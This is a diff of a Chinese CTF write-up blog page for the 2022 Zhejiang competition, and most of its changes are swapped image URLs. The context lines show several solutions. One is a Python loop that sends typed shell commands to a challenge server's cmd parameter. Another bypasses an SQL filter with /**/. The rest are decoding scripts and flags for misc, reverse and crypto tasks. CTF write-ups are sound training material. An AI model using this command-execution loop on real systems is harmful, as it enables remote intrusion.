@@ -25,24 +25,24 @@
 <meta property="og:site_name" content="Dr0n&#39;s blog">
 <meta property="og:description" content="Webezphp12345678910&lt;?phperror_reporting(0);highlight_file(__FILE__);mt_srand(time());$a &#x3D; array(&quot;system&quot;,$_GET[&amp;#x27;cmd&amp;#x27;]);for ($i&#x3D;0;$i&lt;&#x3D;10000;$i++)&amp;#123;    array_push($a,&quot;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezphp-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-babysql-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-m4a-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-Unkn0wnData-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-2.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-3.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-2.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-1.png">
-<meta property="og:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-math-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-1.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-2.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-3.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-4.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-5.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-6.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-7.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-8.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-9.png">
+<meta property="og:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-10.png">
 <meta property="article:published_time" content="2022-09-24T07:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-29T08:47:27.935Z">
+<meta property="article:modified_time" content="2024-03-22T06:54:57.679Z">
 <meta property="article:author" content="dr0n">
 <meta property="article:tag" content="wp">
 <meta property="article:tag" content="2022">
 <meta property="article:tag" content="浙江">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezphp-1.png">
+<meta name="twitter:image" content="https://www.dr0n.top/img/wp/2022/2022zhejiang-final-1.png">
   
   
   
@@ -321,9 +321,9 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd=raw_input(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&#x27;%20&#x27;</span>);<br>    t=<span class="hljs-built_in">int</span>(time.time())<br>    d=requests.get(<span class="hljs-string">&#x27;http://172.29.17.232/index.php?a=%s&amp;cmd=%s&#x27;</span>%(<span class="hljs-built_in">int</span>(t),cmd)).text<br><br>    system=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;system:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br>    c=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;cmd:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br><br>    d=requests.get(<span class="hljs-string">&#x27;http://80.endpoint-d9deec0835844de5831e550ffe384d16.dasc.buuoj.cn:81/?cmd=%s&amp;c=%s&amp;b=%s&#x27;</span>%(cmd,c,system))<br>    <span class="hljs-built_in">print</span>(d.text.split(<span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>)[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
 
 
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezphp-1.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-1.png"></p>
 <h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>过滤了空格，用<code>/**/</code>代替</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-babysql-1.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-2.png"></p>
 <h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>两张图片中间拿到<code>Gift from glzjin: FIWOIxqEZyIWJwIHG01ZDxqMZ1EUGycHGHHlERqnDyAUDyERHH9PI0qOZ0EWGIcEGIxlESSAGREAHGWUF05RAD== Have a nice time, Bye!</code></p>
 <p>先凯撒位移13位</p>
 <p><code>SVJBVkdRMlVJWjVUT01MQkdZM1RHTlpUTUUyREdaQlNHQlREUU9CV0dBM0RJTVpRTVkyRFFNTERNUTJHS05ENQ==</code></p>
@@ -340,12 +340,12 @@
 <p><code>WZHXGU&#123;5v0u98z95u79829y7z484z54066xy08u&#125;</code></p>
 <p>atbash</p>
 <p><code>dasctf&#123;5e0f98a95f79829b7a484a54066cb08f&#125;</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-m4a-1.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-3.png"></p>
 <h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p><em>赛后复现</em></p>
 <p>附件结尾存在一串base64字符串</p>
 <p><code>V2hlcmUxc0tleT8KCu2gve25g+2gve2yte2gvO28v+2gvO2+pO2gve26qu2gvO28j+2gve2wju2gvu21i+2gve26q+2gve24huKche2gvO29je2gvO2+pO2gve2wmO2gvO28j+KEueKMqO2gve24je2gvO2+iOKcie2gvu20o+2gve27qe2gvO29jO2gve26qu2gvO29tOKEueKYuu2gve26ueKdk+2gvO29tO2gve20rO2gvO28qu2gvO29te2gve2xo+2gve20hOKYg+2gve2xjO2gve24ju2gve2xjO2gve20hO2gve2xjO2gve20qu2gvO29jO2gve2xge2gvO29je2gvO29jO2gvO28j+2gvO2+g+2gve26sO2gvO29te2gve2wje2gvO2+heKche2gvO29je2gvu22k+2gve24ju2gve24iu2gvu20o+2gvO2/ue2gvO29je2gve2yp+2gve20hO2gve20hO2gvu20o+2gve2xge2gvu21i+2gve26q+KYuu2gvO29tO2gve24ge2gve26q+2gve24h+2gve26sOKPqe2gve24je2gvO28v+2gve2yte2gvu22k+2gve24h+2gve27qeKclu2gve21ue2gve2wju2gve2zgu2gve2zgu2gve2yp+2gve23ku2gve23kg==</code></p>
 <p>解密后用<code>UTF-8</code>编码显示</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-Unkn0wnData-1.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-4.png"></p>
 <p>stegsolve分析图片，0通道中发现一个压缩包</p>
 <p>解压得到key.txt</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs text">data:<br>0000100000000000<br>00000c0000000000<br>00000e0000000000<br>00002a0000000000<br>0000100000000000<br>0000040000000000<br>0000080000000000<br>00002a0000000000<br>0000160000000000<br>00000b0000000000<br>00000c0000000000<br>00001c0000000000<br>00002a0000000000<br>00002c0000000000<br>0200340000000000<br>00002a0000000000<br>0200090000000000<br>00000c0000000000<br>0000110000000000<br>0000070000000000<br>0200170000000000<br>00002a0000000000<br>0200170000000000<br>00000b0000000000<br>0000080000000000<br>0000120000000000<br>00002a0000000000<br>0200150000000000<br>0000080000000000<br>0000040000000000<br>00000f0000000000<br>00000a0000000000<br>00002a0000000000<br>02000e0000000000<br>0000080000000000<br>00001c0000000000<br>00000a0000000000<br>00002a0000000000<br>0000040000000000<br>0000110000000000<br>0000070000000000<br>00000f0000000000<br>00002a0000000000<br>0200100000000000<br>0000040000000000<br>00000e0000000000<br>0000080000000000<br>0000080000000000<br>00002a0000000000<br>02000c0000000000<br>0000170000000000<br>02001e0000000000<br>0000070000000000<br>00002a0000000000<br></code></pre></td></tr></table></figure>
@@ -366,7 +366,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure>
 
 <p><code>gnuplot</code>画图</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-1.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-5.png"></p>
 <p>得到<code>oursecret</code>密码<code>kfae5y4wi2shwj81y2kda6ax7x</code></p>
 <p>解一下<code>oursecret</code>，拿到<code>U2FsdGVkX18jQgWzhln3pPiVK8gaBxIzhY1JWcFlKiRdBkV/jDmEBxJV9PZmwBJ7MU3IdNf4hWryZLYRLuxA4w==</code></p>
 <p>图片备注中看到<code>糟糕，好像有几个字写的太轻了，看不清楚</code></p>
@@ -374,10 +374,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) &lt; <span class="hljs-number">0xf000</span>:<br>        result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure>
 
 <p><code>gnuplot</code>画图</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-2.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-6.png"></p>
 <p>得到<code>key</code>：<code>w12kax</code></p>
 <p>aes解密</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-3.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-7.png"></p>
 <h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>先安装apk，随意输入一个值，返回<code>error！</code></p>
 <p>jadx中搜索关键字，得到判断代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; ccompare = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(Arrays.asList(<span class="hljs-built_in">this</span>.compare));<br>Integer[] compare = &#123;<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, IntegvalueOf((<span class="hljs-type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION412&#125;;<br><span class="hljs-type">String</span> <span class="hljs-variable">mname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ccadwjlyah&quot;</span>;<br></code></pre></td></tr></table></figure>
@@ -390,19 +390,19 @@
 <p>用户名明文存储，是<code>ccadwjlyah</code></p>
 <p>程序会对输入后的密码加密然后与程序中的<code>compare</code>变量比较</p>
 <p>获取<code>compare</code>数组的值，其中有一个成员存储在变量中</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-2.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-8.png"></p>
 <p>解密脚本</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, <span class="hljs-number">200</span>, <span class="hljs-number">412</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((i&gt;&gt;<span class="hljs-number">2</span>)^<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>
 
 <p>得到密码<code>f4n_4ndro1d</code></p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezandroid-1.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-9.png"></p>
 <p>赛后发现的一个非预期：因为最后flag是存储在图片中的，所以直接把apk当压缩包解压，去找图片也能看到flag</p>
 <h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>因为加密代码<code>(str.index(i)*key+7)%37</code>中取余了37，所以key的值可以认为在0~37的范围内</p>
 <p>直接爆破</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span><br>s=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    e=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>            <span class="hljs-keyword">if</span> s[((j*i)+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span>]==a[n]:<br>                e=e+s[j]<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>
 
 <p>爆破出37串字符串，只有一串字符串满足flag格式，即32位十六进制字符串</p>
-<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-math-1.png"></p>
+<p><img src="/img/wp/2022/2022zhejiang-final-10.png"></p>
 <p>flag: <code>799a03b7a82076f5028059681df1b722</code></p>
 
               
